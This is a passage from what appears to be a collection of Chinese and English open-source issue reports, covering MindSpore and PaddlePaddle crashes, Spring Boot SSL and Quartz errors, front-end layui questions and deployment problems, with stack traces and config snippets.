[mindspore/lite/src/lite_mindrt.cc:591] CompileArrow] CompileArrowThroughSwitchCall failed. 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/src/lite_mindrt.cc:156] LiteActorInit] compile arrow failed. 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/src/mindrt_executor.cc:125] Prepare] LiteActorInit failed, actor aid: CpuFP32SubGraph3_0@ 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/src/lite_session.cc:569] CompileGraph] Prepare executor failed: -6 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/tools/benchmark/benchmark.cc:469] RunBenchmark] CompileGraph failed while running 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/tools/benchmark/run_benchmark.cc:63] RunBenchmark] Run Benchmark ControlOneIfBoolOneAddnOneAddn.ms Failed : -6"
c_test/sanity_test/SANITY0033-neonintrinscs failed due to alias analysis not knowing vector type occupy multiple elements,"Smaller test case: Bug only shows up with inlining on. Alias analysis think that: iread v4i32 &lt;* i32&gt; 0 (dread ptr %_273__p_0(1) only affects s[0]. As a result, the dse phase deletes the initialization of s1], s[2] and s[3].   <code>: #include ""arm_neon.h"" int32x4_t foo1(void *p) { return vandq_s32( vld1q_s32(p), vdupq_n_s32(3)); } int main() { int s[] = {7,7,7,7}; int32x4_t r = foo1( &amp;s ); int t[4]; vst1q_s32((void*)&amp;t, r); // printf(""r: %x %x %x %x\n"", t[0], t[1], t[2], t[3]); if (t[0] != 3 || t[1] != 3 || t[2] != 3 || t[3] != 3) abort(); }"
Training job starting with openblas segment fault using docker,"When using latest docker image to run demo under repo, trainer core dumps with the following error:   <code>: word2vec book Program is Terminated. Because you tried to allocate too many memory regions ... sgemm() ..."
1.5 maven下打包,"打包过程 1.调整git上的目录结构src/main/[java,resources,webapp] 2.修改pom.xml文件，add compilerArguments. extdirs 3.mvn eclipse:clean package -Dmaven.test.skip=true   <code>: &lt;!-- compiler插件, 设定JDK版本 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.0&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;${jdk.version}&lt;/source&gt; &lt;target&gt;${jdk.version}&lt;/target&gt; &lt;showWarnings&gt;true&lt;/showWarnings&gt; &lt;encoding&gt;${project.build.sourceEncoding}&lt;/encoding&gt; &lt;compilerArguments&gt; &lt;extdirs&gt;src/main/webapp/WEB-INF/lib&lt;/extdirs&gt; &lt;/compilerArguments&gt; &lt;/configuration&gt; &lt;/plugin&gt;"
分拣费和计算的时候为什么按箱收费？而不是按商品数量收费？,现在计算分拣费用的时候有这样的计量 为什么不是直接按数量计价？   <code>: (sum(wi.qm_ok_quat) / mg.chl_shl) as qmcount
更多操作里面单引号里面怎么加引号,"这里如果row.userId是字符串，需要加引号怎么加嵌套引号 我用斜杠+单引号不行，显示内容是   <code>: more.push(""&lt;a class='btn btn-default btn-xs "" + resetPwdFlag + ""' href='javascript:void(0)' onclick='resetPwd("" + row.userId + "")'&gt;&lt;i class='fa fa-key'&gt;&lt;/i&gt;重置密码&lt;/a&gt; ""); more.push(""&lt;a class='btn btn-default btn-xs "" + resetPwdFlag + ""' href='javascript:void(0)' onclick='resetPwd(\'"" + row.userId + ""\')'&gt;&lt;i class='fa fa-key'&gt;&lt;/i&gt;重置密码&lt;/a&gt; ""); &lt;a class=""btn btn-default btn-xs "" href=""javascript:void(0)"" onclick=""resetPwd("" 100')'&gt;&lt;i class=""fa fa-key""&gt;&lt;/i&gt;重置密码&lt;/a&gt;"
[CT][MS][dropout2d]dropout2d chinese API has some errors and has no English version API,"ops.function dropout2d 中文版api有的描述错误以及没有英文版API 2.nn.Dropout2d 官网上没有API信息 3.ops层算子Dropout3D Api中英文内容不一致 / 硬件环境: /device ascend/GPU/CPU/ : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): ops层与nn层dropout2d官网资料检查 打开官网， 检查nn层与ops dropout2d API资料 1.nn层与ops层dropout2d均有中英文资料， 且描述一致，正确，完整 1.ops层function dropout2d没有英文资料， 且中文描述有几处错误 a.x和rais里数据类型描述不完整， 缺少float64 b.中文版输出建议与英文版保持一致， 分两行对应两个参数， 保留参数名 c.p (float) - 通道的保持概率，介于 0 和 1 之间，例如 p = 0.8，意味着80%的清零概率。默认值：0.5。 这句话描述有误， 前半句写的是“保持概率”， 后半句“ p = 0.8，意味着80%的清零概率” 相冲突 2.官网上nn层dropout2d没有API资料 3.ops层算子Dropout3D Api中英文内容不一致   <code>: x (tensor) - 一个形状为 math:(N, C, H, W) 的 4D Tensor，其中N是批处理大小，C 是的通道数，H 是特征高度，W 是特征宽度。 其数据类型应为int8、int16、int32、int64、float16或float32 TypeError - x 的数据类型不是int8、int16、int32、int64、float16或float32。 返回： Tensor，具有与输入 x 相同的形状和数据类型。 掩码（Tensor），形状与 x 相同，数据类型为bool。"
"js.layer 在弹出iframe内容提交iframe表单内容后, 无法调用前一页的page()方法","代码片段(列表页onclick事件) 代码片段(表单页) }); 其它现象(本人未找到解决方式) 但是如果我操作了修改的弹出表单后(与网站整体的修改方法一致, 直接在column中写a标签), 再次操作自定义的layer弹窗, 表单提交后又能调用到contentWindow.page();方法了.   <code>: 在默认的jqGrid内设置表格中的链接弹窗的layer宽度及高度, 宽度过小后就默认给全屏. 所以我单独给表格的column加了onclick事件, 手动弹出弹窗. 但是提交表单后, 不会刷新列表页的内容 js.layer.open({ type: 2, area: ['500px', '350px'], title: ""${text('平台切换')}"", shadeClose: true, //点击遮罩关闭 resize: false, content: $(obj).attr(""ref"") }); $(""#inputForm"").validate({ submitHandler: function(form){ js.ajaxSubmitForm($(form), function(data){ js.showMessage(data.message); if(data.result == Global.TRUE){ js.closeCurrentTabPage(function(contentWindow){ contentWindow.page(); }); } }, ""json""); } 如果进入点击菜单进入这个列表页直接点击layer弹出事件的话, 提交表单时 contentWindow.page();会报错方法未定义,"
关于springboot配置SSL后Quartz Scheduler报错误的问题,"项目配置了SSL后，项目启动报如下错误：Exception in thread ""Quartz Scheduler [DhEcpScheduler]"" org.springframework.scheduling.SchedulingException: Could not start Quartz Scheduler after delay; nested exception is org.quartz.SchedulerException: The Scheduler cannot be restarted after shutdown() has been called. at org.springframework.scheduling.quartz.SchedulerFactoryBean$1.run(SchedulerFactoryBean.java:753) Caused by: org.quartz.SchedulerException: The Scheduler cannot be restarted after shutdown() has been called. at org.quartz.core.QuartzScheduler.start(QuartzScheduler.java:529) at org.quartz.impl.StdScheduler.start(StdScheduler.java:142) at org.springframework.scheduling.quartz.SchedulerFactoryBean$1.run(SchedulerFactoryBean.java:750) SSL配置： server: 服务器的HTTP端口，默认为80 port: 443 ssl: key-store: src/main/resources/dhedi.keystore key-alias: dheditomcat enabled: true key-password: dhedi789 key-store-type: JKS 在@SpringBootApplication启动类中，新增了 @guhaibin public Connector connector(){ Connector connector=new Connector(""org.apache.coyote.http11.Http11NioProtocol""); connector.setScheme(""http""); connector.setPort(80); connector.setSecure(false); connector.setRedirectPort(443); return connector; }   <code>: @Bean public TomcatServletWebServerFactory tomcatServletWebServerFactory(Connector connector){ TomcatServletWebServerFactory tomcat=new TomcatServletWebServerFactory(){ @Override protected void postProcessContext(Context context) { SecurityConstraint securityConstraint=new SecurityConstraint(); securityConstraint.setUserConstraint(""CONFIDENTIAL""); SecurityCollection collection=new SecurityCollection(); collection.addPattern(""/*""); securityConstraint.addCollection(collection); context.addConstraint(securityConstraint); } }; tomcat.addAdditionalTomcatConnectors(connector); return tomcat; }"
表单重置按钮事件监听，就想你提供一个优雅的事件监听,"吐槽一句，layui事件监听有点鸡肋。特么按钮事件监听还要依赖jquery，。 为什么不把click，change等事件监听上。 如： 或者按钮事件监听上，如： 还有可以考虑element对象上拓展jq的方法，咱以后就不用jq了。   <code>: form.on('click(lay-filter)', function (data) { console.log(data); }); form.on('button(lay-filter)', function (data) { console.log(data); });"
"[CT][MS][pynative] training net in pynative mode, the later step, the slower it runs","GPU -- MindSpore version : vm + pynative -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 目前在两个用例发现该问题，越往后面的step，step耗时越长 用例一 用例二： 深圳湾老师的用例   <code>: def test_pynative_train_net_with_dynamic_shape_longstable(): class Net(nn.Cell, MetaFactory): def __init__(self): super().__init__() MetaFactory.__init__(self) self.fc = nn.Dense(2, 10, weight_init='ones') self.relu = nn.ReLU() self.fc2 = nn.Dense(10, 10, weight_init='ones') self.expand = P.ExpandDims() self.squezze0 = P.Squeeze(0) self.squezze1 = P.Squeeze(1) def construct(self, x): x = self.fc(x) if x[0][0] &lt; x[0][1]: x = self.relu(x) else: x = self.fc2(x) if x[0, 0] &gt; 0: out = self.expand(x, 0) else: out = self.expand(x, 1) out = self.relu(out) if x[0, 0] &gt; 0: out = self.squezze0(out) else: out = self.squezze1(out) return out net = Net() net.set_train() loss = nn.SoftmaxCrossEntropyWithLogits(sparse=False, reduction=""mean"") opt = nn.Momentum(learning_rate=0.1, momentum=0.9, params=filter(lambda x: x.requires_grad, net.get_parameters())) loss_net = nn.WithLossCell(net, loss) train_net = nn.TrainOneStepCell(loss_net, opt) for i in range(38000): start_tme = time.time() input_np = np.random.randn(32, 2).astype(np.float32) target = np.random.randint(0, 10, size=(32,)) target_onehot = np.zeros(shape=(32, 10)) target_onehot[np.arange(32), target] = 1 target_np = target_onehot.astype(np.float32) train_net(Tensor(input_np), Tensor(target_np)) end_time = time.time() print(""-- {} epoch, time is {} ms"".format(i, (end_time - start_tme)*1000)) input_val = np.random.randn(32, 2).astype(np.float32) net(Tensor(input_val))"
Mac 系统节点获取进程列表异常,"JDK: java version ""1.8.0_192"" Java(TM) SE Runtime Environment (build 1.8.0_192-b12) Java HotSpot(TM) 64-Bit Server VM (build 25.192-b12, mixed mode) Jpom: 分支：dev3.0.x OS:   <code>: 2020-11-18 20:09:54,877 ERROR [http-nio-2123-exec-5] c.j.c.DefaultSystemLog [AgentExceptionHandler.java:32]- x:() controller /processList java.lang.NumberFormatException: For input string: ""invalid"" at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Integer.parseInt(Integer.java:580) at java.lang.Integer.parseInt(Integer.java:615) at io.jpom.common.commander.impl.LinuxSystemCommander.formatLinuxTop(LinuxSystemCommander.java:83) at io.jpom.common.commander.impl.LinuxSystemCommander.getProcessList(LinuxSystemCommander.java:51) at io.jpom.controller.WelcomeController.getProcessList(WelcomeController.java:76) at io.jpom.controller.WelcomeController$$FastClassBySpringCGLIB$$db4ddfee.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:749) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor.invoke(MethodBeforeAdviceInterceptor.java:56) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:55) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) at io.jpom.controller.WelcomeController$$EnhancerBySpringCGLIB$$ae77c5fc.getProcessList(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:892) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908) at javax.servlet.http.HttpServlet.service(HttpServlet.java:660) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at cn.jiangzeyin.common.request.XssFilter.doFilterInternal(XssFilter.java:122) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:853) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
BeanUtil处理null 问题反馈,"a的一个属性为null，b的这个属性为1，null会覆盖1，正常情况下，应该是不希望1被覆盖的，比如参数copy时候   <code>: BeanUtil.copyProperties(a, b);"
部署后几个功能无法使用的疑问,"环境信息 ???? 怎么部署的？ 什么版本？？？ 已经部署完成,有几个功能好像用不了。 背景说明 ngnix部署配置： 问题本身 问题一 接口返回400 请求连接 返回数据 问题二 功能如何使用？路由重定向的地址是好像有错误。 问题三 redis缓存监控是需要自己架设吗？架设工具是什么？ 问题四 请求过程中一直有请求产生，但是返回一直错误。这个请求做什么的，需要怎么改正   <code>: server { # 切记此处端口一定要跟暴露的端口一样，否则会引起路由端口不正确 listen 7003; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; } location ~* ^/(code|auth|admin|gen|daemon|tx|act) { proxy_pass http://pigx-gateway:9999; #proxy_set_header Host $http_host; proxy_connect_timeout 15s; proxy_send_timeout 15s; proxy_read_timeout 15s; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } /act/ws/info http://xxxxxx:xxx/act/ws/info?t=1550220518077 {""timestamp"":""2019-02-15 16:59:16"",""path"":""/act/ws/info"",""status"":400,""error"":""Bad Request"",""message"":""Invalid 'Upgrade' header: [X-Real-IP:\""172.18.0.1\"", X-Forwarded-For:\""172.18.0.1\"", Host:\""pigx-gateway:9999\"", Connection:\""close\"", User-Agent:\""Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36\"", Accept:\""*/*\"", Referer:\""http://60.205.200.85:7003/\"", Accept-Encoding:\""gzip, deflate\"", Accept-Language:\""zh-CN,zh;q=0.9\"", Cookie:\""iconSize=16x16; jenkins-timestamper-offset=-28800000; _ga=GA1.4.875717647.1546071178\""]""} 服务监控 http://139.224.200.249:19999/ http://139.224.200.249:19999/csrf"
[MS][NET]Retinaface_ResNet50 training with one card failed.,": /device gpu : -- MindSpore version : master 2021/12/27 commit_id = ''[sha1]:bc2f07fa,[branch]:(HEAD-&gt;master,origin/master,origin/HEAD)'' models version: r1.5, commit_id: 0044bcc3 -- Python version : Python 3.7.5 -- OS platform and distribution : Ubuntu 18.04 -- GCC/Compiler version : test_ms_modelzoo_retinaface_resnet50_perf copy r1.5 models Retinaface_ResNet50 scripts. use one device execute train. train failed, init occur failed. train success. master + r1.5models代码， Retinaface_ResNet50单卡训练失败   <code>: [CRITICAL] DISTRIBUTED(107468, 7fe101795740,python): ...[mindspore/ccsrc/distributed/cluster/cluster_context.cc:159] InitNodeRole] Role name is invalid. Traceback (most recent call last): File ""train.py"", line 118, in &lt;module&gt; train(cfg=config) File ""train.py"", line 40, in train init(""nccl"") File ""lib/python3.7/site-packages/mindspore/communication/management.py"", line 143, in init init_gpu_collective() RuntimeError: mindspore/ccsrc/distributed/cluster/cluster_context.cc:159 InitNodeRole] Role name is invalid."
fix typo: you -> we,"Hi paddle developers, In this tutorial, I guess it should be rather than according to context. Please check it, thanks.   <code>: We You"
knife4j配置全局参数没有默认值问题,"版本knife4j-spring-boot-starter 3.0.2 代码 页面 代码中配置了默认参数，但在页面上还是没有默认值和描述相关信息   <code>: @Bean public Docket createRestApi() { List&lt;Response&gt; responseList = new ArrayList&lt;&gt;(); List&lt;RequestParameter&gt; requestParameters = new ArrayList&lt;&gt;(); requestParameters.add(new RequestParameterBuilder() .name(""username"") .description(""用户名"") .in(ParameterType.HEADER) .query(parameterSpecificationBuilder -&gt; parameterSpecificationBuilder.defaultValue(""zhangsan"") .allowEmptyValue(false)) .required(true) .build()); Docket docket = new Docket(DocumentationType.OAS_30) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) .build() .globalRequestParameters(requestParameters); return docket; }"
Mac上paddle安装成功后执行时报段错误,"运行demo中sentiment的例子，报一下错误： 利用gdb调试得到的信息： make test 发现一些单测过不了：   <code>: I1104 10:38:17.781116 2008993792 Util.cpp:130] Calling runInitFunctions I1104 10:38:17.781256 2008993792 Util.cpp:143] Call runInitFunctions done. [INFO 2016-11-04 10:38:17,889 networks.py:1282] The input order is [word, label] [INFO 2016-11-04 10:38:17,889 networks.py:1289] The output order is [__cost_0__] I1104 10:38:17.891353 2008993792 Trainer.cpp:170] trainer mode: Normal *** Aborted at 1478227097 (unix time) try ""date -d @1478227097"" if you are using GNU date *** PC: @ 0x10edc27f8 paddle::Weight::Weight() *** SIGSEGV (@0xa0) received by PID 9930 (TID 0x7fff77bed000) stack trace: *** @ 0x7fff856ffeaa _sigtramp @ 0x0 (unknown) @ 0x10eb9bbcd paddle::TableProjection::TableProjection() @ 0x10eb9c29e _ZNSt3__128__invoke_void_return_wrapperIPN6paddle10ProjectionEE6__callIJRZNS1_14ClassRegistrarIS2_JNS1_16ProjectionConfigENS_10shared_ptrINS1_9ParameterEEEbEE13registerClassINS1_15TableProjectionEEEvRKNS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEEEUlS7_SA_bE_S7_SA_bEEES3_DpOT_ @ 0x10eb9c20d _ZNSt3__110__function6__funcIZN6paddle14ClassRegistrarINS2_10ProjectionEJNS2_16ProjectionConfigENS_10shared_ptrINS2_9ParameterEEEbEE13registerClassINS2_15TableProjectionEEEvRKNS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEEEUlS5_S8_bE_NSF_ISK_EEFPS4_S5_S8_bEEclEOS5_OS8_Ob @ 0x10ebac7ef _ZN6paddle14ClassRegistrarINS_10ProjectionEJNS_16ProjectionConfigENSt3__110shared_ptrINS_9ParameterEEEbEE12createByTypeERKNS3_12basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEES2_S6_b @ 0x10ebac66d paddle::Projection::create() @ 0x10ebb60d8 paddle::MixedLayer::init() @ 0x10ec12242 paddle::NeuralNetwork::init() @ 0x10ec18a83 paddle::MultiGradientMachine::MultiGradientMachine() @ 0x10ec2017e paddle::GradientMachine::create() @ 0x10ec9ae46 paddle::TrainerInternal::init() @ 0x10ec96be7 paddle::Trainer::init() @ 0x10eb93d1b main @ 0x7fff940e95ad start @ 0xb (unknown) /Users/baidu/local/bin/paddle: line 81: 9930 Segmentation fault: 11 ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2} I1104 10:37:35.910127 2008993792 Util.cpp:155] commandline: /Users/baidu/local/opt/paddle/bin/paddle_trainer --config=trainer_config.py --save_dir=./model_output --job=train --use_gpu=false --trainer_count=4 --num_passes=10 --log_period=10 --dot_period=20 --show_parameter_stats_period=100 --test_all_data_in_one_period=1 I1104 10:37:35.910747 2008993792 Util.cpp:130] Calling runInitFunctions I1104 10:37:35.910902 2008993792 Util.cpp:143] Call runInitFunctions done. [New Thread 0x1913 of process 9904] [INFO 2016-11-04 10:37:36,410 networks.py:1282] The input order is [word, label] [INFO 2016-11-04 10:37:36,410 networks.py:1289] The output order is [__cost_0__] I1104 10:37:36.412492 2008993792 Trainer.cpp:170] trainer mode: Normal Thread 1 received signal SIGSEGV, Segmentation fault. paddle::Weight::Weight (this=0x107a6af70, height=0, width=128, param=...) at /Users/baidu/codehub/Paddle/paddle/parameter/Weight.cpp:21 21 VectorPtr vPtr = param-&gt;getBuf(PARAMETER_VALUE); The following tests FAILED: 22 - test_PyDataProvider (Failed) 24 - test_RecurrentGradientMachine (Failed) 25 - test_NetworkCompare (Failed) 26 - test_PyDataProvider2 (Failed) 30 - test_Prediction (Failed) 31 - test_Compare (Failed) 32 - test_Trainer (Failed) 33 - test_TrainerOnePass (Failed) 34 - test_CompareTwoNets (Failed) 35 - test_CompareTwoOpts (Failed) 36 - test_CompareSparse (Failed) 37 - test_recurrent_machine_generation (Failed) 38 - test_PyDataProviderWrapper (Failed) 39 - test_config_parser (Failed) 40 - test_swig_api (Failed) 41 - layers_test (Failed) 42 - test_layerHelpers (Failed) Errors while running CTest make: *** [test] Error 8"
error_msg: MindRecord File could not open successfully.,"error occurs when the mindrecord data gets written to the same path : /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : write some mindrecord data to some path using mindspore.mindrecord.FileWriter write new mindrecord data to the same path to overwrite old data error occurs overwrite mindrecord data failed overwrite mindrecord data success [MRMOpenError]: error_code: 1347690596, error_msg: MindRecord File could not open successfully.   <code>: [ERROR] ME(78:140061913048896,MainProcess):2020-05-31-06:59:53.215.019 [mindspore/mindrecord/shardwriter.py:52] Failed to open paths --------------------------------------------------------------------------- MRMOpenError Traceback (most recent call last) &lt;ipython-input-95-69540cdead57&gt; in &lt;module&gt; ----&gt; 1 convert_np_to_mindrecord(X_train, y_train, X_test, y_test) &lt;ipython-input-91-87b399826f3e&gt; in convert_np_to_mindrecord(X_train, y_train, X_test, y_test, mindrecord_save_path) 7 writer.add_schema(schema_json, ""nlp_schema"") 8 writer.add_index([""id"", ""label""]) ----&gt; 9 writer.write_raw_data(data_train) 10 writer.commit() 11 ~/miniconda3/envs/myconda/lib/python3.7/site-packages/mindspore/mindrecord/filewriter.py in write_raw_data(self, raw_data, parallel_writer) 228 """""" 229 if not self._writer.is_open: --&gt; 230 self._writer.open(self._paths) 231 if not self._writer.get_shard_header(): 232 self._writer.set_shard_header(self._header) ~/miniconda3/envs/myconda/lib/python3.7/site-packages/mindspore/mindrecord/shardwriter.py in open(self, paths) 51 if ret != ms.MSRStatus.SUCCESS: 52 logger.error(""Failed to open paths"") ---&gt; 53 raise MRMOpenError 54 self._is_open = True 55 return ret MRMOpenError: [MRMOpenError]: error_code: 1347690596, error_msg: MindRecord File could not open successfully."
频繁的报空指针异常，不知何故，但不影响使用,异常信息如下：   <code>: 8-Dec-2015 13:58:56.018 SEVERE [Thread-8] net.oschina.j2cache.Command.parse Unabled to parse received command. java.io.IOException: java.lang.NullPointerException at de.ruedigermoeller.serialization.FSTObjectInput.readObject(FSTObjectInput.java:168) at net.oschina.j2cache.util.FSTSerializer.deserialize(FSTSerializer.java:49) at net.oschina.j2cache.util.SerializationUtils.deserialize(SerializationUtils.java:66) at net.oschina.j2cache.Command.parse(Command.java:107) at net.oschina.j2cache.RedisCacheChannel.onMessage(RedisCacheChannel.java:277) at redis.clients.jedis.BinaryJedisPubSub.process(BinaryJedisPubSub.java:102) at redis.clients.jedis.BinaryJedisPubSub.proceed(BinaryJedisPubSub.java:80) at redis.clients.jedis.BinaryJedis.subscribe(BinaryJedis.java:2929) at net.oschina.j2cache.RedisCacheChannel$1.run(RedisCacheChannel.java:52) at java.lang.Thread.run(Thread.java:745) Caused by: java.lang.NullPointerException
fix the order of compare op,"problem The current compare ops only contain: , and we use to represent , but this is not right, because x and y in element_wise_op may have different dims, like: is different with . solution and should be independent with each other.   <code>: &lt;, &lt;=, == y &lt; x x &gt; y x [10, 20] &gt; 10 10 &gt; x [10, 20] &gt; &lt;"
Distributed training crash: Tensor not initialized yet when Tensor::type() is called,"The pserver program crashed: Command lines: notest_dist_label_semantic_roles.py is taken from here   <code>: GLOG_logtostderr=1 GLOG_v=3 PSERVERS=172.17.0.5:6174 SERVER_ENDPOINT=172.17.0.5:6174 TRAINING_ROLE=PSERVER python notest_dist_label_semantic_roles.py GLOG_logtostderr=1 GLOG_v=3 PSERVERS=172.17.0.5:6174 SERVER_ENDPOINT=172.17.0.5:6174 TRAINING_ROLE=TRAINER python notest_dist_label_semantic_roles.py GLOG_logtostderr=1 GLOG_v=3 PSERVERS=172.17.0.5:6174 SERVER_ENDPOINT=172.17.0.5:6174 TRAINING_ROLE=TRAINER python notest_dist_label_semantic_roles.py I0119 20:57:50.408042 18810 operator.cc:488] expected_kernel_key:data_type[5]:data_layout[ANY_LAYOUT]:place[CPUPlace]:library_type[PLAIN] I0119 20:57:50.408121 18810 executor.cc:118] Op(sum), inputs:{X[fc_9.w_0@GRAD.trainer_0[128, 512]({}), fc_9.w_0@GRAD.trainer_1[128, 512]({})]}, outputs:{Out[fc_9.w_0@GRAD[0]({})]}. I0119 20:57:50.408139 18810 operator.cc:488] expected_kernel_key:data_type[5]:data_layout[ANY_LAYOUT]:place[CPUPlace]:library_type[PLAIN] I0119 20:57:50.408466 18810 executor.cc:118] Op(scale), inputs:{X[fc_9.w_0@GRAD[128, 512]({})]}, outputs:{Out[fc_9.w_0@GRAD[128, 512]({})]}. I0119 20:57:50.408480 18810 operator.cc:488] expected_kernel_key:data_type[5]:data_layout[ANY_LAYOUT]:place[CPUPlace]:library_type[PLAIN] I0119 20:57:50.408519 18810 executor.cc:118] Op(sgd), inputs:{Grad[fc_9.w_0@GRAD[128, 512]({})], LearningRate[learning_rate_74[1]({})], Param[fc_9.w_0[128, 512]({})]}, outputs:{ParamOut[fc_9.w_0[128, 512]({})]}. I0119 20:57:50.408534 18810 operator.cc:488] expected_kernel_key:data_type[5]:data_layout[ANY_LAYOUT]:place[CPUPlace]:library_type[PLAIN] terminate called after throwing an instance of 'paddle::platform::EnforceNotMet' what(): holder_ should not be null Tensor not initialized yet when Tensor::type() is called. at [/home/helin/repo/Paddle/paddle/framework/tensor.h:114] PaddlePaddle Call Stacks: 0 0x7f4a39523f17p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 727 1 0x7f4a39524b01p paddle::framework::Tensor::type() const + 209 2 0x7f4a39f1e337p paddle::framework::SerializeToStream(std::ostream&amp;, paddle::framework::Tensor const&amp;, paddle::platform::DeviceContext const&amp;) + 119 3 0x7f4a39f1be1ep paddle::framework::SerializeToStream(std::ostream&amp;, paddle::framework::LoDTensor const&amp;, paddle::platform::DeviceContext const&amp;) + 510 4 0x7f4a39e47850p paddle::operators::detail::SerializeToMessage(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, paddle::framework::Variable const*, paddle::platform::DeviceContext const&amp;, sendrecv::VariableMessage*) + 896 5 0x7f4a39e537c8p paddle::operators::detail::RequestGet::Process() + 232 6 0x7f4a39e4edcfp paddle::operators::detail::AsyncGRPCServer::HandleRequest(bool, grpc::ServerCompletionQueue*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::function&lt;void ()&gt;) + 879 7 0x7f4a39e5235ap 